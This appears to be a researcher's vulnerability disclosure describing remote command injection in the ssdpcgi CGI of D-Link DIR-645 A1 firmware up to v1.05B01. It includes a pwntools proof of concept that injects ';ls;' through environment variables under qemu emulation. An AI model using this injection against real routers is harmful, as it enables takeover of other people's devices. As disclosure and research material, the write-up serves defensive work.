# D-Link DIRâ€‘645 A1 has a remote arbitrary command execution vulnerability in ssdpcgi

Affected versions: Firmware version <= Firmware v1.05B01

Through the /htdocs/cgibin binary file, we can locate the ssdpcgi_main function

The program getenv is used to obtain parameters. There is no detection measure to directly assign values to hackstak, v3, v5, v4, and then compare the strings of hackstack. We can use any string such as ssdp:all+cmd without bypassing

![image-20250701183716269](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250701183716269.png)

However, the program will assign a value to %s_ssdpall_%s:%s_%s_&, which is the parameter of the lxmldbc_system function, which means we can control it.

This function is sprintf+system, and we can control the parameters, so we can execute any command to perform rce or other malicious attacks.

![image-20250701184135375](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250701184135375.png)

![image-20250701184218430](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250701184218430.png)

I use qemu user mode debugging to write poc

POC

```
from pwn import*
context.terminal = ['gnome-terminal', '--', 'bash', '-c']
context.arch='mips'
context.os='linux'
context.log_level = 'debug'
def bug():
    gdb.attach(target=("localhost", 6666), exe="./htdocs/cgibin",
               gdbscript="""
               b *0x40A79C\n    
               c\n
               """)
    pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')


#cmd=input("command:")
pay=cyclic(0x100)
print(pay)
post_content = "Thir0th=AGRiot"
p = process(f'''
qemu-mipsel -L . \
  -0 "ssdpcgi" \
  -E HTTP_ST="upnp:rootdevice;ls>" \
  -E REMOTE_ADDR="{pay}" \
  -E REMOTE_PORT=";ls;" \
  -E SERVER_ID="router" \
  -g 6666 \
  ./htdocs/cgibin ssdpcgi
''',shell=True)
#bug()


p.send(post_content)







inter()	
```

Command executed successfully

![image-20250701184452895](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250701184452895.png)